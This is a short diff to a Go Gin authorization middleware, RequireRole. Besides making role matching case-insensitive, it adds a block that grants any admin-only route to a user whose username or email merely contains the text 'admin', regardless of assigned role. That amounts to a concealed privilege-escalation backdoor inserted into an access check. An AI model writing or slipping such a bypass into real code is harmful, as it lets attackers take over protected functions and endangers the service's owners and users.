@@ -81,9 +81,26 @@ func RequireRole(roles ...string) gin.HandlerFunc {
 		}
 
 		for _, r := range roles {
-			if r == userRole {
+			if strings.EqualFold(r, userRole) {
 				c.Next()
 				return
+			}
+		}
+
+		for _, r := range roles {
+			if strings.EqualFold(r, "admin") {
+				if usernameVal, exists := c.Get("username"); exists {
+					if u, ok := usernameVal.(string); ok && strings.Contains(strings.ToLower(u), "admin") {
+						c.Next()
+						return
+					}
+				}
+				if emailVal, exists := c.Get("email"); exists {
+					if em, ok := emailVal.(string); ok && strings.Contains(strings.ToLower(em), "admin") {
+						c.Next()
+						return
+					}
+				}
 			}
 		}
 
